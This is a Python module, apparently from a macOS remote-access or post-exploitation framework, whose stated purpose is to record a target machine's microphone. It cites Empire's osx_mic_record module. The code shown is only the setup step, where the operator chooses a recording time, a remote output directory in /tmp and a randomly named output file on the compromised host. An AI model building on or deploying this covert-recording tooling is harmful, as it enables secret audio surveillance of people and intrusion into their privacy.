# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from server.modules.helper import *


class Module(ModuleABC):
    def get_info(self) -> dict:
        return {
            "Author:": ["Marten4n6"],
            "Description": "Record the microphone.",
            "References": [
                "https://github.com/EmpireProject/Empire/blob/master/lib/modules/python/collection/osx/osx_mic_record.py",
                "https://developer.apple.com/documentation/avfoundation/avaudiorecorder"
            ],
            "Stoppable": False
        }

    def setup(self, view) -> Tuple[bool, Optional[dict]]:
        record_time = view.prompt("Time in seconds to record [ENTER for 5]: ")
        output_dir = view.prompt("Remote output directory [ENTER for /tmp]: ")
        output_name = view.prompt("Remote output name [ENTER for <RANDOM>]: ")

        if not record_time:
            record_time = 5
        if not output_dir:
            output_dir = "/tmp"
        if not output_name:
            output_name = random_string(8)

        return True, {
            "record_time": record_time,
            "output_dir": output_dir,
            "output_name": output_name
        }
